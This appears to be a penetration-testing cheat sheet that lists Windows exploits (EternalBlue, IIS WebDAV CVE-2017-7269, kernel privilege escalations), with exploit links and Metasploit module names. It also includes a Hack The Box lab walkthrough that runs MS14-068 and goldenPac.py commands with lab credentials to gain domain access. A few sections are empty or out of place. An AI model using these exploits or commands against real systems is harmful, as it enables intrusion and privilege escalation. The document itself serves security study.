## Exploits

### IIS

#### MS16-143 / CVE-2017-7269 -
- Buffer overflow in the ScStoragePathFromUrl function in the WebDAV service in Internet Information Services (IIS) 6.0 in Microsoft Windows Server 2003 R2.
- Allows remote code execution.
- Via a long header beginning with "If: <http://" in a PROPFIND request.

Exploits:
- [https://www.exploit-db.com/exploits/41738](https://www.exploit-db.com/exploits/41738)
- [https://github.com/gottburgm/Exploits/tree/master/CVE-2017-7269](https://github.com/gottburgm/Exploits/tree/master/CVE-2017-7269)
- [https://github.com/edwardz246003/IIS_exploit](https://github.com/edwardz246003/IIS_exploit)
- `exploit/windows/iis/iis_webdav_scstoragepathfromurl`

References:
- [0patching the "Immortal" CVE-2017-7269](https://blog.0patch.com/2017/03/0patching-immortal-cve-2017-7269.html)

### SMB

#### MS17-010 - EternalBlue SMB Remote Windows Kernel Pool Corruption
- Vista SP2, 2008 SP2, 7 SP1, 2008 R2, 8.1, 2012, 2012 R2, RT 8.1, 10, 2016
- CVE-2017-0143 to  CVE-2017-0148

Exploit:
- [https://github.com/worawit/MS17-010](https://github.com/worawit/MS17-010)
- [https://github.com/nixawk/labs/blob/master/MS17_010/smb_exploit.py](https://github.com/nixawk/labs/blob/master/MS17_010/smb_exploit.py)
- [https://github.com/qazbnm456/awesome-cve-poc/blob/master/MS17-010.md](https://github.com/qazbnm456/awesome-cve-poc/blob/master/MS17-010.md)
- `exploit/windows/smb/ms17_010_eternalblue`

References:
- [https://blogs.technet.microsoft.com/srd/2017/06/29/eternal-champion-exploit-analysis/](https://blogs.technet.microsoft.com/srd/2017/06/29/eternal-champion-exploit-analysis/)
- [https://github.com/qazbnm456/awesome-cve-poc/blob/master/MS17-010.md](https://github.com/qazbnm456/awesome-cve-poc/blob/master/MS17-010.md)
- [https://blog.rapid7.com/2017/05/19/metasploit-the-power-of-the-community-and-eternalblue/](https://blog.rapid7.com/2017/05/19/metasploit-the-power-of-the-community-and-eternalblue/)

## Other (Local)

### MS17-013 - Microsoft Graphics Componen
- Vista SP2, 2008 SP2, 7 SP1, 2008 R2, RT 8.1, 10, 2016,

Exploit:
- [https://www.exploit-db.com/exploits/41656](https://www.exploit-db.com/exploits/41656)

References:

### MS10-061 - Windows Printer Spooler (Stuxnet)
- XP SP2/SP3, 2003 SP2, Vista SP1/SP2, 2008, 7, 2008 R2
- Execute code with `SYSTEM` privilege if a printer is shared on the network (patched September 2010)
- Making DCE RPC request to the StartDocPrinter procedure (notifies the spooler that a new job arrived)
- Impersonate the Printer Spooler service (spoolsv.exe) to create a file (from working dir: `%SystemRoot%\system32`)
- Sending `WritePrinter` requests, an attacker can fully control the content of the created file
- Gain code execution by writing to a directory used by WMI to deploy applications
  - `Wbem\Mof` is periodically scanned and any new `.mof` files

References:
- [http://poppopret.blogspot.com/2011/09/playing-with-mof-files-on-windows-for.html](http://poppopret.blogspot.com/2011/09/playing-with-mof-files-on-windows-for.html)
- os/windows/wmi.md


## Privilege Escalation Exploits

### MS16-032 - Secondary Logon to Address Elevation of Privilege
- Win7-Win10 & 2008-2012 - 32/64 bit
- Machine must have 2+ CPU cores

Exploits:
- [https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-032](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-032)
- [http://willgenovese.com/ms16-032-one-liners/](http://willgenovese.com/ms16-032-one-liners/)
- `ms16_032_secondary_logon_handle_privesc`

References:
- [https://googleprojectzero.blogspot.co.uk/2016/03/exploiting-leaked-thread-handle.html](https://googleprojectzero.blogspot.co.uk/2016/03/exploiting-leaked-thread-handle.html)

### MS11-080 -  Ancillary Function Driver (AfdJoinLeaf)
- XP, 2003 - 32/64 bit

Exploits:
- [https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS11-080](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS11-080)
- [https://www.exploit-db.com/exploits/18176](https://www.exploit-db.com/exploits/18176)
- [https://hackingandsecurity.blogspot.com/2016/05/ms11-080-privilege-escalation-windows.html](https://hackingandsecurity.blogspot.com/2016/05/ms11-080-privilege-escalation-windows.html)

```
python py installer module
python pyinsaller.py --onefile example.py
```

### MS12-042 - Windows Kernel - SYSRET
- XP SP3, 2003, 7, 2008 R2

Exploits:
- [https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS12-042](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS12-042)
- [https://www.exploit-db.com/exploits/20861](https://www.exploit-db.com/exploits/20861)

### MS15-051 - Windows Kernel-Mode Drivers (client_copy_image)
- 2003 SP2, Vista SP2, 2008 SP2, 7 SP1, 2008 R2 SP1, 8, 8.1, 2012, 2012 R2, RT, RT 8.1 - 32/64 bit

Exploits:
- [https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051)
- [https://www.exploit-db.com/exploits/37049](https://www.exploit-db.com/exploits/37049)
- [https://github.com/hfiref0x/CVE-2015-1701](https://github.com/hfiref0x/CVE-2015-1701)
- `exploit/windows/local/ms15_051_client_copy_image`

References:
- [https://www.fireeye.com/blog/threat-research/2015/04/probable_apt28_useo.html](https://www.fireeye.com/blog/threat-research/2015/04/probable_apt28_useo.html)

### MS10-092 - Task Scheduler
- Vista SP1/SP2, 2008, 7 2008 R2 - 32/64bit

Exploits:
- [https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-092](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-092)
- `exploit/windows/local/ms10_092_schelevator`

References:
- [https://docs.microsoft.com/en-us/security-updates/securitybulletins/2010/ms10-092](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2010/ms10-092)
- [http://daveschull.com/wp-content/uploads/2015/05/Stuxnet_Under_the_Microscope.pdf](http://daveschull.com/wp-content/uploads/2015/05/Stuxnet_Under_the_Microscope.pdf)

### MS14-058 - TrackPopupMenu Win32k NULL Pointer Dereference
- 2003, Vista, 2008, 2008 R2, 8, 8.1, 2012, 2012 R2, RT, RT 8.1,

Exploits:
- [https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-058](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-058)
- `exploit/windows/local/ms14_058_track_popup_menu`

References:
- [https://www.crowdstrike.com/blog/crowdstrike-discovers-use-64-bit-zero-day-privilege-escalation-exploit-cve-2014-4113-hurricane-panda/](https://www.crowdstrike.com/blog/crowdstrike-discovers-use-64-bit-zero-day-privilege-escalation-exploit-cve-2014-4113-hurricane-panda/)
- [https://www.freebuf.com/articles/system/50110.html](https://www.freebuf.com/articles/system/50110.html)

### MS14-070 - tcpip!SetAddrOptions NULL Pointer Dereference
- 2003 SP2

Exploits:
- [https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-070](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-070)
- `exploit/windows/local/ms14_070_tcpip_ioctl`

References:
- [https://blog.korelogic.com/blog/2015/01/28/2k3_tcpip_setaddroptions_exploit_dev](https://blog.korelogic.com/blog/2015/01/28/2k3_tcpip_setaddroptions_exploit_dev)
- [https://korelogic.com/Resources/Advisories/KL-001-2015-001.txt](https://korelogic.com/Resources/Advisories/KL-001-2015-001.txt)

### bypassuac_eventvwr
### MS10-015 - Kitrap0d
### MS14-068 - Kerberos Domain Privilege Escalation

Exploits:
- [Python Kerberos Exploitation Kit - https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek)

```
apt-get install krb5-user cifs-utils rdate
# Add proper nameservers in /etc/hosts
```
```
/etc/krb5.conf

    [libdefaults]
        default_realm = HTB.LOCAL

        # The following krb5.conf variables are only for MIT Kerberos.
      	kdc_timesync = 1
      	ccache_type = 4
      	forwardable = true
      	proxiable = true

    #Edit the realms entry as follows:
    [realms]
        LAB.LOCAL = {
            kdc = mantis.htb.local:88
            admin_server = mantis.htb.local
            default_domain = HTB.LOCAL
        }

    #Also edit the final section:
    [domain_realm]
        .domain.internal = HTB.LOCAL
        domain.internal = HTB.LOCAL
```
```
net time -S 10.10.10.52 -U ""
# Set local time accordingly
# OR USE
rdate -n 10.10.10.52
```
```
python ms14-068.py -u james@htb.local -d mantis.htb.local
-p J@m3s_P@ssW0rd! -s S-1-5-21-4220043660-4019079961-2895681657
```

Rename the generated ticket to ​`/tmp/krb5cc_0​`
```
mv TGT_James@HTB.local.ccache /tmp/krb5cc_0
```

With Impacket (Golden PAC module):
- `kinit james`  (options ?)
- `klist` (options ?)
- ​`python goldenPac.py htb.local/james@mantis.htb.local`​
- Entering the password for the ​ `james` ​ user

Manually:
```
smbclient -W HTB.LOCAL //MANTIS/c$ -k
```

References:
- [Additional information about CVE-2014-6324](https://blogs.technet.microsoft.com/srd/2014/11/18/additional-information-about-cve-2014-6324/)
- [Attack Methods for Gaining Domain Admin Rights in Active Directory](https://adsecurity.org/?p=2362)
- HTB - Mantis

### CVE-2017-0213 - COM Aggregate Marshaler/IRemUnknown2 Type Confusion Privilege Escalation

- 10, 7, 8.1, 2008, 2008 R2, 2012, 2012 R2, 2016
- When accessing an OOP COM object using IRemUnknown2 the local unmarshaled proxy can be for a different interface to that requested by QueryInterface resulting in a type confusion which can result in EoP.

Exploit:
- [https://github.com/WindowsExploits/Exploits/tree/master/CVE-2017-0213](https://github.com/WindowsExploits/Exploits/tree/master/CVE-2017-0213)

References:
- [https://bugs.chromium.org/p/project-zero/issues/detail?id=1107](https://bugs.chromium.org/p/project-zero/issues/detail?id=1107)
- [https://www.exploit-db.com/exploits/42020](https://www.exploit-db.com/exploits/42020)
